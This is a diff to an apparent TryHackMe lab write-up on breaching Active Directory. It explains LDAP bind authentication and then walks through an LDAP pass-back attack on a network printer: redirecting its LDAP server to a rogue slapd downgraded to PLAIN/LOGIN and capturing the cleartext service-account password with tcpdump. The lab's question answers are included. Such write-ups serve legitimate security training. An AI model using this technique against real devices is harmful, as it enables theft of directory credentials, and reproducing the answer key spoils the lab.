@@ -116,3 +116,135 @@ def password_spray(self, password, url):
 > 3. How many valid credentials pairs were found by the password spraying script? - `4`
 > 
 > 4. What is the message displayed by the web application when authenticating with a valid credential pair? - `Hello World`
+
+## Task 4 : LDAP Bind Credentials 
+
+- LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials.
+- The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.
+
+The authentication process is as follows :
+
+
+ 1. The user provides their credentials (username and password) to the system.
+ 2. The system sends a bind request to the LDAP server, containing the user’s credentials.
+ 3. The LDAP server checks the user’s credentials against the data stored in its directory.
+ 4. If the credentials match, the server sends a success message to the system, indicating that the user has been authenticated.
+ 5. The system grants the user access to the requested resource.
+ 6. If the credentials do not match, the server sends a failure message to the system, indicating that the user has not been authenticated.
+ 7. The system denies the user access to the requested resource.
+
+![image](https://github.com/user-attachments/assets/949ea84e-bb88-4e16-bdf5-e1ee99d4b1ea)
+
+### LDAP Pass-back Attacks -
+
+**LDAP Pass-Back attacks** is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.
+
+- LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified.
+- This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as `admin:admin` or `admin:password`.
+- Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server.
+- In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.
+
+A network printer with web interface is available at http://printer.za.tryhackme.com/settings.aspx .
+
+![image](https://github.com/user-attachments/assets/2d2e289e-08f1-4bcc-b5d5-30f72d5a078c)
+
+Viewing page source , we can see that the username is visible bu the password is hidden.
+
+![image](https://github.com/user-attachments/assets/f36d2fc4-10e8-4621-ab84-01b7e2aacf50)
+
+After updating the **server ip** to our machine ip, once we click **Test Settings** we get a connection back to our netcat.
+
+![image](https://github.com/user-attachments/assets/66a14bc5-d729-42d7-b1a3-22ecb388b868)
+
+> The `supportedCapabilities` response tells us we have a problem.
+> 
+> Essentially, before the printer sends over the credentials, it is trying to negotiate the LDAP authentication method details. It will use this negotiation to select the most secure authentication method that both the printer and the LDAP server support. If the authentication method is too secure, the credentials will not be transmitted in cleartext. With some authentication methods, the credentials will not be transmitted over the network at all! So we can't just use normal Netcat to harvest the credentials. We will need to create a rogue LDAP server and configure it insecurely to ensure the credentials are sent in plaintext.
+
+**Hosting a Rogue LDAP Server** :
+
+1. Run - `sudo dpkg-reconfigure -p low slapd`
+2. Omit OpenLDAP server configuration? No
+3. DNS domain name: (AD domain name) i.e. za.tryhackme.com
+4. Organization name: (AD domain name) i.e. za.tryhackme.com
+5. Confrim with you administrator passwd which done by initial configuration.
+6. Do you want the database to be removed when slapd is purged? No
+7. Move old database files before creating a new database YES
+
+In order to obtain the clear-text credentials, we must reconfigure our LDAP server to only support the **PLAIN and LOGIN authentication methods**. To do this, we need to create a new LDIF file with the following information:
+
+```
+#olcSaslSecProps.ldif
+dn: cn=config
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+```
+
+> The file has the following properties:
+>
+> 1. olcSaslSecProps: Specifies the SASL security properties
+>   
+> 2. noanonymous: Disables mechanisms that support anonymous login
+>
+> 3. minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.
+
+Apply changes & restart the server 
+
+```bash
+┌──(kali㉿kali)-[~/THM/BreachingAD]
+└─$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+
+SASL/EXTERNAL authentication started
+SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
+SASL SSF: 0
+modifying entry "cn=config"
+```
+
+Verify the modification
+
+```bash
+┌──(kali㉿kali)-[~/THM/BreachingAD]
+└─$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
+dn:
+supportedSASLMechanisms: LOGIN
+supportedSASLMechanisms: PLAIN
+```
+**Capturing LDAP Credentials** :
+
+Start tcp dump on our attacker machine then click on Test settings in the printer page.
+
+```bash
+┌──(kali㉿kali)-[~/THM/BreachingAD]
+└─$ sudo tcpdump -SX -i breachad tcp port 389
+
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
+09:54:30.531831 IP 10.200.25.201.63885 > 10.50.23.21.ldap: Flags [SEW], seq 3190580035, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
+        0x0000:  4502 0034 f977 4000 7f06 bc72 0ac8 19c9  E..4.w@....r....
+        0x0010:  0a32 1715 f98d 0185 be2c 6343 0000 0000  .2.......,cC....
+        0x0020:  80c2 faf0 11b0 0000 0204 0509 0103 0308  ................
+        0x0030:  0101 0402                                ....
+09:54:30.531848 IP 10.50.23.21.ldap > 10.200.25.201.63885: Flags [S.], seq 3196238520, ack 3190580036, win 32120, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+        0x0000:  4500 0034 0000 4000 4006 f4ec 0a32 1715  E..4..@.@....2..
+        0x0010:  0ac8 19c9 0185 f98d be82 bab8 be2c 6344  .............,cD
+        0x0020:  8012 7d78 15f2 0000 0204 05b4 0101 0402  ..}x............
+        0x0030:  0103 0307                                ....
+09:54:30.794970 IP 10.200.25.201.63885 > 10.50.23.21.ldap: Flags [.], ack 3196238521, win 1027, length 0
+        0x0000:  4500 0028 f978 4000 7f06 bc7f 0ac8 19c9  E..(.x@.........
+        0x0010:  0a32 1715 f98d 0185 be2c 6344 be82 bab9  .2.......,cD....
+        0x0020:  5010 0403 d039 0000                      P....9..
+09:54:32.102759 IP 10.200.25.201.63887 > 10.50.23.21.ldap: Flags [P.], seq 2693358489:2693358554, ack 1345660156, win 1027, length 65
+        0x0000:  4500 0069 f983 4000 7f06 bc33 0ac8 19c9  E..i..@....3....
+        0x0010:  0a32 1715 f98f 0185 a089 6399 5035 24fc  .2........c.P5$.
+        0x0020:  5018 0403 1cab 0000 3084 0000 003b 0201  P.......0....;..
+        0x0030:  0a60 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
+        0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
+        0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
+        0x0060:  6461 7070 6173 7331 40                   dappass1@
+```
+
+> 1. What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems? - `LDAP Pass-back attack`
+> 
+> 2. What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text? - `LOGIN, PLAIN`
+> 
+> 3. What is the password associated with the svcLDAP account? - `tryhackmeldappass1@`
+
